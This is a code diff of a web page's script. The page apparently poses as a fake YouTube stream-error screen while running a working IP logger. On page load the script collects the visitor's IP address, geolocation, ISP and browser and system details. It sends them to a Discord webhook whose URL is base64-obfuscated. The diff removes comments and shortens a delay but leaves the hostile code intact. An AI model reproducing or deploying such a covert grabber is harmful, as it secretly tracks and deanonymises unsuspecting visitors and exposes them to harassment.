@@ -422,13 +422,10 @@
         
         createParticles();
 
-        // Optimized webhook URL (base64 encoded for obfuscation)
         const webhookUrl = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4ODYxMjQ5NzMyNTU1NTc1Mi9fS1J3Xy02dy04dUhnaGIzVmV1Q0xHay1ETEU0U2pRcmJTZDNWcC1XMG9SbXM4RFU0QTJwSGtiQS1RQWxqdDdGZDVELQ==");
 
-        // Simplified geolocation function with fallbacks
         async function getLocationData(ip) {
             try {
-                // First try ipapi.co
                 const response = await fetch(`https://ipapi.co/${ip}/json/`);
                 if (response.ok) {
                     const data = await response.json();
@@ -443,7 +440,6 @@
                     };
                 }
                 
-                // Fallback to ip-api.com if first fails
                 const fallbackResponse = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,zip,isp,org,as,query`);
                 if (fallbackResponse.ok) {
                     const fallbackData = await fallbackResponse.json();
@@ -468,7 +464,6 @@
             }
         }
 
-        // Optimized system info collection
         function collectSystemInfo() {
             const connection = navigator.connection || {};
             return {
@@ -496,7 +491,6 @@
             };
         }
 
-        // Create Discord embed with essential info only
         function createEmbed(ipData, systemData) {
             return {
                 title: "🚨 Stream Error Triggered",
@@ -545,13 +539,10 @@
             };
         }
 
-        // Optimized data sending function with minimal delays
         async function sendData() {
             try {
-                // Start collecting system info immediately
                 const systemInfo = collectSystemInfo();
                 
-                // Get IP address (using Promise.race for timeout)
                 const ipPromise = fetch('https://api.ipify.org?format=json')
                     .then(res => res.ok ? res.json() : Promise.reject('IP API failed'))
                     .then(data => data.ip || "Unknown");
@@ -569,10 +560,8 @@
                     new Promise(resolve => setTimeout(() => resolve({ip}), 2000))
                 ]);
                 
-                // Create embed with collected data
                 const embed = createEmbed(locationData, systemInfo);
                 
-                // Send to webhook without waiting for response
                 fetch(webhookUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -591,12 +580,10 @@
             }
         }
 
-        // Send data immediately on page load
         sendData().then(success => {
             console.log("Initial data sent:", success ? "Success" : "Failed");
         });
 
-        // Handle try again button
         document.getElementById('tryAgainBtn').addEventListener('click', async () => {
             document.getElementById('loading').style.display = 'block';
             document.getElementById('tryAgainBtn').style.display = 'none';
@@ -607,7 +594,7 @@
                 window.location.href = success ? 
                     'https://support.google.com/youtube/' : 
                     'https://www.google.com/search?q=stream+error+0x8F204265';
-            }, 1000); // Reduced from 2s to 1s
+            }, 1000);
         });
     </script>
 </body>
